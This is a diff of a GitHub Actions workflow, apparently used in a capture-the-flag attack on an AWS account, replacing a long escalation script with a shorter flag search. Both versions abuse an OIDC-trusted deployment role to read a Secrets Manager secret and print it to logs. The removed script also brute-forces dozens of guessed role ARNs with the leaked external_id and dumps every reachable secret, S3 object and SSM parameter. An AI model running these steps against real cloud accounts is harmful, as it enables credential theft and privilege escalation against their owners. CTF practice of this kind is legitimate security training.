@@ -1,505 +1,91 @@
-name: AWS OIDC Secret Retrieval
+name: Simple Flag Search
 
 on:
-  workflow_dispatch:  # Manual trigger for testing
-  push:
-    branches: [ main, master ]
+  workflow_dispatch:
 
-# Required for OIDC token generation
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  retrieve-secrets:
+  search-flag:
     runs-on: ubuntu-latest
     
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v4
-      
     - name: Configure AWS credentials using OIDC
       uses: aws-actions/configure-aws-credentials@v4
       with:
         role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
-        role-session-name: GitHubActions-SecretRetrieval
+        role-session-name: FlagSearch
         aws-region: us-west-2
         
-    - name: Verify AWS identity
+    - name: Search for flag in accessible locations
       run: |
-        echo "Current AWS identity:"
-        aws sts get-caller-identity
+        echo "=== FLAG SEARCH ==="
         
-    - name: Retrieve secret from AWS Secrets Manager
-      run: |
-        echo "Retrieving secret: internal/secrets/id-v2"
-        SECRET_VALUE=$(aws secretsmanager get-secret-value \
+        # Get the external_id
+        EXTERNAL_ID=$(aws secretsmanager get-secret-value \
           --secret-id "internal/secrets/id-v2" \
           --query SecretString \
-          --output text)
-        echo "Secret retrieved successfully"
-        echo "Secret value: $SECRET_VALUE"
-        
-    - name: Parse and use credentials (if JSON format)
-      run: |
-        SECRET_VALUE=$(aws secretsmanager get-secret-value \
-          --secret-id "internal/secrets/id-v2" \
-          --query SecretString \
-          --output text)
-        
-        # Check if it's JSON format with AWS credentials
-        if echo "$SECRET_VALUE" | jq . > /dev/null 2>&1; then
-          echo "Secret is in JSON format"
-          echo "$SECRET_VALUE" | jq .
-          
-          # Extract credentials if they exist
-          ACCESS_KEY=$(echo "$SECRET_VALUE" | jq -r '.aws_access_key_id // .AccessKeyId // empty')
-          SECRET_KEY=$(echo "$SECRET_VALUE" | jq -r '.aws_secret_access_key // .SecretAccessKey // empty')
-          ROLE_ARN=$(echo "$SECRET_VALUE" | jq -r '.role_arn // .RoleArn // empty')
-          
-          if [ ! -z "$ACCESS_KEY" ] && [ ! -z "$SECRET_KEY" ]; then
-            echo "Found AWS credentials in secret"
-            echo "Access Key: $ACCESS_KEY"
-            echo "Secret Key: ${SECRET_KEY:0:10}..."
-            
-            # If there's a role ARN, assume that role
-            if [ ! -z "$ROLE_ARN" ]; then
-              echo "Found role ARN: $ROLE_ARN"
-              echo "Attempting to assume elevated role..."
-              
-              # Configure new credentials
-              export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
-              export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
-              
-              # Assume the elevated role
-              ELEVATED_CREDS=$(aws sts assume-role \
-                --role-arn "$ROLE_ARN" \
-                --role-session-name "ElevatedAccess" \
-                --output json)
-              
-              if [ $? -eq 0 ]; then
-                echo "Successfully assumed elevated role"
-                echo "$ELEVATED_CREDS" | jq .
-                
-                # Extract new temporary credentials
-                export AWS_ACCESS_KEY_ID=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.AccessKeyId')
-                export AWS_SECRET_ACCESS_KEY=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.SecretAccessKey')
-                export AWS_SESSION_TOKEN=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.SessionToken')
-                
-                echo "New identity with elevated role:"
-                aws sts get-caller-identity
-                
-                # Look for flags in common locations
-                echo "Searching for flags with elevated permissions..."
-                
-                # Check S3 buckets
-                echo "=== S3 Buckets ==="
-                aws s3 ls || echo "No S3 access or no buckets"
-                
-                # Check for any accessible S3 objects
-                for bucket in $(aws s3 ls | awk '{print $3}' 2>/dev/null); do
-                  echo "Checking bucket: $bucket"
-                  aws s3 ls s3://$bucket/ --recursive | grep -i flag || true
-                done
-                
-                # Check Secrets Manager for more secrets
-                echo "=== Additional Secrets ==="
-                aws secretsmanager list-secrets || echo "No additional secrets access"
-                
-                # Check Parameter Store
-                echo "=== Parameter Store ==="
-                aws ssm describe-parameters || echo "No parameter store access"
-                
-                # Look for flags in parameters
-                aws ssm get-parameters-by-path --path "/" --recursive || echo "No parameter access"
-                
-              else
-                echo "Failed to assume elevated role"
-              fi
-            fi
-          fi
-        else
-          echo "Secret is not in JSON format:"
-          echo "$SECRET_VALUE"
-        fi
-        
-    - name: Search for roles using external_id
-      run: |
-        SECRET_VALUE=$(aws secretsmanager get-secret-value \
-          --secret-id "internal/secrets/id-v2" \
-          --query SecretString \
-          --output text)
-        
-        EXTERNAL_ID=$(echo "$SECRET_VALUE" | jq -r '.external_id')
-        echo "Using external_id: $EXTERNAL_ID"
-        
-        # Try to list IAM roles to find potential targets
-        echo "=== Searching for IAM roles ==="
-        aws iam list-roles --query 'Roles[?contains(RoleName, `privilege`) || contains(RoleName, `admin`) || contains(RoleName, `elevated`) || contains(RoleName, `secret`)].[RoleName,Arn]' --output table || echo "Cannot list roles"
-        
-        # Try simple role names first - CTFs often use basic patterns
-        POTENTIAL_ROLES=(
-          "arn:aws:iam::170974506515:role/audit"
-          "arn:aws:iam::170974506515:role/auditor"
-          "arn:aws:iam::170974506515:role/admin"
-          "arn:aws:iam::170974506515:role/elevated"
-          "arn:aws:iam::170974506515:role/privileged"
-          "arn:aws:iam::170974506515:role/maintenance"
-          "arn:aws:iam::170974506515:role/diagnostics"
-          "arn:aws:iam::170974506515:role/weekly"
-          "arn:aws:iam::170974506515:role/hexnova"
-          "arn:aws:iam::170974506515:role/hexnova404"
-          "arn:aws:iam::170974506515:role/vault"
-          "arn:aws:iam::170974506515:role/secrets"
-          "arn:aws:iam::170974506515:role/HX9F3A1"
-          "arn:aws:iam::170974506515:role/extidHX9F3A1"
-          "arn:aws:iam::170974506515:role/HX"
-          "arn:aws:iam::170974506515:role/audit-access-role"
-          "arn:aws:iam::170974506515:role/audit_access_role"
-          "arn:aws:iam::170974506515:role/weekly-diagnostics-role"
-          "arn:aws:iam::170974506515:role/weekly_diagnostics_role"
-          "arn:aws:iam::170974506515:role/maintenance-role"
-          "arn:aws:iam::170974506515:role/maintenance_role"
-          "arn:aws:iam::170974506515:role/diagnostics-role"
-          "arn:aws:iam::170974506515:role/diagnostics_role"
-          "arn:aws:iam::170974506515:role/weekly-audit-role"
-          "arn:aws:iam::170974506515:role/weekly_audit_role"
-          "arn:aws:iam::170974506515:role/audit-role"
-          "arn:aws:iam::170974506515:role/audit_role"
-          "arn:aws:iam::170974506515:role/audit-test-role"
-          "arn:aws:iam::170974506515:role/audit_test_role"
-          "arn:aws:iam::170974506515:role/leak-detection-role"
-          "arn:aws:iam::170974506515:role/leak_detection_role"
-          "arn:aws:iam::170974506515:role/security-test-role"
-          "arn:aws:iam::170974506515:role/security_test_role"
-          "arn:aws:iam::170974506515:role/compliance-audit-role"
-          "arn:aws:iam::170974506515:role/compliance_audit_role"
-          "arn:aws:iam::170974506515:role/internal-audit-role"
-          "arn:aws:iam::170974506515:role/internal_audit_role"
-          "arn:aws:iam::170974506515:role/hexnova-audit-role"
-          "arn:aws:iam::170974506515:role/hexnova_audit_role"
-          "arn:aws:iam::170974506515:role/hexnova404-audit-role"
-          "arn:aws:iam::170974506515:role/hexnova404_audit_role"
-          "arn:aws:iam::170974506515:role/auditor-role"
-          "arn:aws:iam::170974506515:role/auditor_role"
-          "arn:aws:iam::170974506515:role/security-audit-role"
-          "arn:aws:iam::170974506515:role/security_audit_role"
-          "arn:aws:iam::170974506515:role/internal-auditor-role"
-          "arn:aws:iam::170974506515:role/internal_auditor_role"
-          "arn:aws:iam::170974506515:role/privileged-access-role"
-          "arn:aws:iam::170974506515:role/admin-role"
-          "arn:aws:iam::170974506515:role/elevated-access-role"
-          "arn:aws:iam::170974506515:role/secret-access-role"
-          "arn:aws:iam::170974506515:role/cross-account-role"
-          "arn:aws:iam::170974506515:role/external-role"
-          "arn:aws:iam::170974506515:role/high-privilege-role"
-          "arn:aws:iam::170974506515:role/vault-access-role"
-          "arn:aws:iam::170974506515:role/sensitive-data-role"
-          "arn:aws:iam::170974506515:role/hexnova-admin-role"
-          "arn:aws:iam::170974506515:role/hexnova404-role"
-          "arn:aws:iam::170974506515:role/production-role"
-          "arn:aws:iam::170974506515:role/deployment-role"
-          "arn:aws:iam::170974506515:role/security-role"
-          "arn:aws:iam::170974506515:role/backup-role"
-          "arn:aws:iam::170974506515:role/data-access-role"
-          "arn:aws:iam::170974506515:role/flag-access-role"
-          "arn:aws:iam::170974506515:role/ctf-role"
-          "arn:aws:iam::170974506515:role/breach-investigation-role"
-          "arn:aws:iam::170974506515:role/incident-response-role"
-          "arn:aws:iam::170974506515:role/organization-vault-role"
-          "arn:aws:iam::170974506515:role/vault-role"
-          "arn:aws:iam::170974506515:role/internal-role"
-          "arn:aws:iam::170974506515:role/secrets-role"
-          "arn:aws:iam::170974506515:role/atr-role"
-          "arn:aws:iam::170974506515:role/action-theft-role"
-          "arn:aws:iam::170974506515:role/atr3404-role"
-          "arn:aws:iam::170974506515:role/HX-role"
-          "arn:aws:iam::170974506515:role/hx-admin-role"
-          "arn:aws:iam::170974506515:role/hexnova-vault-role"
-          "arn:aws:iam::170974506515:role/organization-admin-role"
-          "arn:aws:iam::170974506515:role/breach-response-role"
-          "arn:aws:iam::170974506515:role/forensics-role"
-        )
-        
-    - name: Search for roles using external_id
-      run: |
-        SECRET_VALUE=$(aws secretsmanager get-secret-value \
-          --secret-id "internal/secrets/id-v2" \
-          --query SecretString \
-          --output text)
-        
-        EXTERNAL_ID=$(echo "$SECRET_VALUE" | jq -r '.external_id')
-        echo "Using external_id: $EXTERNAL_ID"
-        
-        # Try to list IAM roles to find potential targets
-        echo "=== Searching for IAM roles ==="
-        aws iam list-roles --query 'Roles[?contains(RoleName, `privilege`) || contains(RoleName, `admin`) || contains(RoleName, `elevated`) || contains(RoleName, `secret`)].[RoleName,Arn]' --output table || echo "Cannot list roles"
-        
-        # The leaked Role_arn was github-deployment-role
-        # Maybe we need to assume the SAME role again but with the external_id?
-        TARGET_ROLE="arn:aws:iam::170974506515:role/github-deployment-role"
-        
-        echo "=== Testing the github-deployment-role with external_id ==="
-        echo "Current role: $(aws sts get-caller-identity --query Arn --output text)"
-        echo "Target role: $TARGET_ROLE"
+          --output text | jq -r '.external_id')
         echo "External ID: $EXTERNAL_ID"
         
-        # Try to assume the github-deployment-role again, but with external_id
+        # Check if external_id itself is a secret name or contains the flag
         echo ""
-        echo "Attempting to assume github-deployment-role WITH external_id..."
-        if aws sts assume-role \
-          --role-arn "$TARGET_ROLE" \
-          --role-session-name "ElevatedSession" \
-          --external-id "$EXTERNAL_ID" \
-          --output json > /tmp/elevated_creds.json 2>/dev/null; then
-          
-          echo "✅ SUCCESS! Assumed github-deployment-role with external_id!"
-          cat /tmp/elevated_creds.json | jq .
-          
-          # Export new credentials
-          export AWS_ACCESS_KEY_ID=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.AccessKeyId')
-          export AWS_SECRET_ACCESS_KEY=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SecretAccessKey') 
-          export AWS_SESSION_TOKEN=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SessionToken')
-          
-          echo ""
-          echo "New elevated identity:"
-          aws sts get-caller-identity
-          
-        else
-          echo "❌ Failed to assume github-deployment-role with external_id"
-          echo ""
-          echo "=== Trying other potential roles ==="
-          
-          POTENTIAL_ROLES=(
-            "arn:aws:iam::170974506515:role/audit"
-            "arn:aws:iam::170974506515:role/auditor"
-            "arn:aws:iam::170974506515:role/admin"
-            "arn:aws:iam::170974506515:role/maintenance"
-            "arn:aws:iam::170974506515:role/diagnostics"
-            "arn:aws:iam::170974506515:role/hexnova"
-            "arn:aws:iam::170974506515:role/vault"
-            "arn:aws:iam::170974506515:role/elevated"
-            "arn:aws:iam::170974506515:role/privileged"
-            "arn:aws:iam::170974506515:role/weekly"
-            "arn:aws:iam::170974506515:role/secrets"
-            "arn:aws:iam::170974506515:role/hexnova404"
-          )
-          
-          for ROLE_ARN in "${POTENTIAL_ROLES[@]}"; do
-            echo "Testing: $ROLE_ARN"
-            if aws sts assume-role \
-              --role-arn "$ROLE_ARN" \
-              --role-session-name "ElevatedSession" \
-              --external-id "$EXTERNAL_ID" \
-              --output json > /tmp/elevated_creds.json 2>/dev/null; then
-              
-              echo "✅ SUCCESS! Assumed $ROLE_ARN"
-              break
-            fi
-          done
-        fi
+        echo "=== Testing external_id variations ==="
         
-        # If we have elevated credentials, search for the flag
-        if [ -f /tmp/elevated_creds.json ] && [ -s /tmp/elevated_creds.json ]; then
-          echo ""
-          echo "=== SEARCHING FOR FLAGS WITH ELEVATED PERMISSIONS ==="
-          
-          # Export credentials if not already done
-          export AWS_ACCESS_KEY_ID=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.AccessKeyId')
-          export AWS_SECRET_ACCESS_KEY=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SecretAccessKey')
-          export AWS_SESSION_TOKEN=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SessionToken')
-          
-          echo "Current identity:"
-          aws sts get-caller-identity
-          
-          # Check S3 with elevated permissions
-          echo ""
-          echo "--- S3 Buckets ---"
-          aws s3 ls 2>/dev/null || echo "No S3 access"
-          
-          # Try the original bucket with elevated permissions
-          echo ""
-          echo "Checking original bucket with elevated permissions:"
-          aws s3 ls s3://atr3404-63428fb6/ 2>/dev/null || echo "Still cannot access original bucket"
-          
-          # Look for new buckets or objects
-          for bucket in $(aws s3 ls | awk '{print $3}' 2>/dev/null); do
-            echo ""
-            echo "=== Bucket: $bucket ==="
-            aws s3 ls s3://$bucket/ --recursive 2>/dev/null | head -20
-            
-            # Try to get flag files
-            echo "Looking for flag files in $bucket..."
-            aws s3 cp s3://$bucket/flag.txt - 2>/dev/null && echo "" || true
-            aws s3 cp s3://$bucket/flag - 2>/dev/null && echo "" || true  
-            aws s3 cp s3://$bucket/FLAG - 2>/dev/null && echo "" || true
-            aws s3 cp s3://$bucket/flag.json - 2>/dev/null && echo "" || true
-          done
-          
-          # Check additional secrets with elevated permissions
-          echo ""
-          echo "--- Additional Secrets ---"
-          aws secretsmanager list-secrets 2>/dev/null || echo "No additional secrets access"
-          
-          # Try to read all available secrets
-          aws secretsmanager list-secrets 2>/dev/null | jq -r '.SecretList[].Name' | while read secret_name; do
-            if [ ! -z "$secret_name" ]; then
-              echo ""
-              echo "Secret: $secret_name"
-              aws secretsmanager get-secret-value --secret-id "$secret_name" --query SecretString --output text 2>/dev/null || echo "Cannot read this secret"
-            fi
-          done
-          
-          # Check Parameter Store
-          echo ""
-          echo "--- Parameter Store ---"
-          aws ssm get-parameters-by-path --path "/" --recursive 2>/dev/null || echo "No parameter store access"
-          
-    - name: Comprehensive search with current permissions
-      run: |
-        echo "=== COMPREHENSIVE SEARCH WITH CURRENT PERMISSIONS ==="
-        echo "Current identity: $(aws sts get-caller-identity --query Arn --output text)"
+        # Maybe the flag is hidden in the external_id
+        echo "External ID decoded attempts:"
+        
+        # Try the external_id as a secret name
+        aws secretsmanager get-secret-value --secret-id "$EXTERNAL_ID" 2>/dev/null || echo "extidHX9F3A1 not a secret"
+        
+        # Try HX9F3A1 part  
+        aws secretsmanager get-secret-value --secret-id "HX9F3A1" 2>/dev/null || echo "HX9F3A1 not a secret"
+        
+        # Try just HX
+        aws secretsmanager get-secret-value --secret-id "HX" 2>/dev/null || echo "HX not a secret"
+        
+        # Maybe it's a parameter instead
+        aws ssm get-parameter --name "$EXTERNAL_ID" 2>/dev/null || echo "Not a parameter"
+        aws ssm get-parameter --name "HX9F3A1" 2>/dev/null || echo "HX9F3A1 not a parameter"
+        
         echo ""
+        echo "=== S3 Flag Search ==="
         
-        # Maybe the flag is accessible with our current github-deployment-role permissions
-        echo "=== S3 EXPLORATION ==="
-        
-        # List all S3 buckets we can see
-        echo "Available S3 buckets:"
-        aws s3 ls 2>/dev/null || echo "No S3 list access"
-        
-        # Try to access the original bucket in different ways
-        echo ""
-        echo "=== Original bucket comprehensive check ==="
+        # Try the original bucket with specific flag files
         BUCKET="atr3404-63428fb6"
-        echo "Bucket: $BUCKET"
         
-        # Try different access patterns
-        echo "1. List bucket root:"
-        aws s3 ls s3://$BUCKET/ 2>/dev/null || echo "Cannot list root"
+        # Common flag file names
+        aws s3 cp s3://$BUCKET/flag.txt - 2>/dev/null || echo "No flag.txt"
+        aws s3 cp s3://$BUCKET/flag.html - 2>/dev/null || echo "No flag.html" 
+        aws s3 cp s3://$BUCKET/admin.html - 2>/dev/null || echo "No admin.html"
+        aws s3 cp s3://$BUCKET/secret.txt - 2>/dev/null || echo "No secret.txt"
+        aws s3 cp s3://$BUCKET/private.html - 2>/dev/null || echo "No private.html"
         
-        echo "2. List with recursive:"
-        aws s3 ls s3://$BUCKET/ --recursive 2>/dev/null || echo "Cannot list recursive"
-        
-        echo "3. Try to get specific files that might exist:"
-        aws s3 cp s3://$BUCKET/flag.txt - 2>/dev/null && echo "" || echo "No flag.txt"
-        aws s3 cp s3://$BUCKET/flag - 2>/dev/null && echo "" || echo "No flag"
-        aws s3 cp s3://$BUCKET/FLAG - 2>/dev/null && echo "" || echo "No FLAG"
-        aws s3 cp s3://$BUCKET/flag.json - 2>/dev/null && echo "" || echo "No flag.json"
-        aws s3 cp s3://$BUCKET/secret.txt - 2>/dev/null && echo "" || echo "No secret.txt"
-        
-        echo "4. Try common file extensions:"
-        aws s3 cp s3://$BUCKET/flag.html - 2>/dev/null && echo "" || echo "No flag.html"
-        aws s3 cp s3://$BUCKET/secret.html - 2>/dev/null && echo "" || echo "No secret.html"
-        aws s3 cp s3://$BUCKET/admin.html - 2>/dev/null && echo "" || echo "No admin.html"
-        aws s3 cp s3://$BUCKET/private.html - 2>/dev/null && echo "" || echo "No private.html"
-        
-        echo "5. Try directories:"
-        aws s3 ls s3://$BUCKET/admin/ 2>/dev/null || echo "No admin/ directory"
-        aws s3 ls s3://$BUCKET/private/ 2>/dev/null || echo "No private/ directory"
-        aws s3 ls s3://$BUCKET/secret/ 2>/dev/null || echo "No secret/ directory"
-        aws s3 ls s3://$BUCKET/flag/ 2>/dev/null || echo "No flag/ directory"
-        aws s3 ls s3://$BUCKET/internal/ 2>/dev/null || echo "No internal/ directory"
+        # Try files named after the external_id
+        aws s3 cp s3://$BUCKET/$EXTERNAL_ID.txt - 2>/dev/null || echo "No $EXTERNAL_ID.txt"
+        aws s3 cp s3://$BUCKET/HX9F3A1.txt - 2>/dev/null || echo "No HX9F3A1.txt"
         
         echo ""
-        echo "=== SECRETS MANAGER EXPLORATION ==="
+        echo "=== Simple Secret Names ==="
         
-        # Try to list secrets we might have access to
-        echo "Attempting to list secrets:"
-        aws secretsmanager list-secrets 2>/dev/null || echo "No list-secrets permission"
-        
-        # Try to access other potential secrets
-        echo ""
-        echo "Trying other potential secret names:"
-        POTENTIAL_SECRETS=(
-          "flag"
-          "ctf-flag"
-          "final-flag"
-          "hexnova404/flag"
-          "internal/flag"
-          "production/flag"
-          "admin/credentials"
-          "vault/flag"
-          "audit/flag"
-          "maintenance/flag"
-          "internal/secrets/flag"
-          "internal/secrets/final"
-          "internal/secrets/ctf"
-          "atr3404/flag"
-        )
-        
-        for secret in "${POTENTIAL_SECRETS[@]}"; do
-          echo "Trying secret: $secret"
-          aws secretsmanager get-secret-value --secret-id "$secret" --query SecretString --output text 2>/dev/null || echo "Cannot access $secret"
-        done
+        # Try simple flag-related secret names
+        aws secretsmanager get-secret-value --secret-id "flag" 2>/dev/null || echo "No 'flag' secret"
+        aws secretsmanager get-secret-value --secret-id "ctf-flag" 2>/dev/null || echo "No 'ctf-flag' secret"
+        aws secretsmanager get-secret-value --secret-id "internal/flag" 2>/dev/null || echo "No 'internal/flag' secret"
+        aws secretsmanager get-secret-value --secret-id "hexnova404/flag" 2>/dev/null || echo "No 'hexnova404/flag' secret"
         
         echo ""
-        echo "=== PARAMETER STORE EXPLORATION ==="
+        echo "=== Check what we can actually list ==="
         
-        # Check if we can access Parameter Store
-        echo "Checking Parameter Store access:"
-        aws ssm describe-parameters 2>/dev/null || echo "No Parameter Store access"
+        # What can we actually see?
+        echo "S3 buckets we can list:"
+        aws s3 ls 2>/dev/null || echo "Cannot list S3"
         
-        # Try to get parameters by path
-        echo "Trying parameter paths:"
-        aws ssm get-parameters-by-path --path "/" --recursive 2>/dev/null || echo "No parameter path access"
-        aws ssm get-parameters-by-path --path "/flag" --recursive 2>/dev/null || echo "No /flag path"
-        aws ssm get-parameters-by-path --path "/internal" --recursive 2>/dev/null || echo "No /internal path"
-        aws ssm get-parameters-by-path --path "/hexnova404" --recursive 2>/dev/null || echo "No /hexnova404 path"
+        echo "Secrets we can list:"
+        aws secretsmanager list-secrets 2>/dev/null || echo "Cannot list secrets"
         
         echo ""
-        echo "=== OTHER AWS SERVICES ==="
-        
-        # Check other services we might have access to
-        echo "Checking DynamoDB:"
-        aws dynamodb list-tables 2>/dev/null || echo "No DynamoDB access"
-        
-        echo "Checking Lambda:"
-        aws lambda list-functions 2>/dev/null || echo "No Lambda access"
-        
-        echo "Checking CloudFormation:"
-        aws cloudformation list-stacks 2>/dev/null || echo "No CloudFormation access"
-        
-        echo ""
-        echo "=== USING EXTERNAL_ID AS A CLUE ==="
-        
-        # Maybe the external_id itself contains the flag or is a clue
-        EXTERNAL_ID="extidHX9F3A1"
-        echo "External ID: $EXTERNAL_ID"
-        echo "Maybe the external_id contains encoded information?"
-        
-        # Try using parts of external_id as secret names
-        echo "Trying external_id components as secret names:"
-        aws secretsmanager get-secret-value --secret-id "$EXTERNAL_ID" --query SecretString --output text 2>/dev/null || echo "External_id is not a secret name"
-        aws secretsmanager get-secret-value --secret-id "HX9F3A1" --query SecretString --output text 2>/dev/null || echo "HX9F3A1 is not a secret name"
-        aws secretsmanager get-secret-value --secret-id "HX" --query SecretString --output text 2>/dev/null || echo "HX is not a secret name"
-        
-        echo ""
-        echo "=== FINAL ATTEMPT: CHECK IF FLAG IS IN CURRENT SECRET ==="
-        
-        # Maybe there's more in the secret we already accessed
-        echo "Re-examining the secret we can access:"
-        SECRET_VALUE=$(aws secretsmanager get-secret-value \
-          --secret-id "internal/secrets/id-v2" \
-          --query SecretString \
-          --output text)
-        
-        echo "Full secret value:"
-        echo "$SECRET_VALUE"
-        
-        # Check if there are other fields we missed
-        echo "Checking for other fields in the secret:"
-        echo "$SECRET_VALUE" | jq . 2>/dev/null || echo "Not valid JSON or already shown"
-        
-        # Maybe the flag is encoded in the external_id itself
-        echo ""
-        echo "=== DECODE ATTEMPTS ON EXTERNAL_ID ==="
-        echo "External ID: $EXTERNAL_ID"
-        
-        # Try decoding as base64
-        echo "Trying base64 decode:"
-        echo "$EXTERNAL_ID" | base64 -d 2>/dev/null || echo "Not base64"
-        
-        # Try hex decode
-        echo "Trying hex decode on numeric part (9F3A1):"
-        echo "9F3A1" | xxd -r -p 2>/dev/null || echo "Not hex"
+        echo "=== Current permissions summary ==="
+        aws sts get-caller-identity
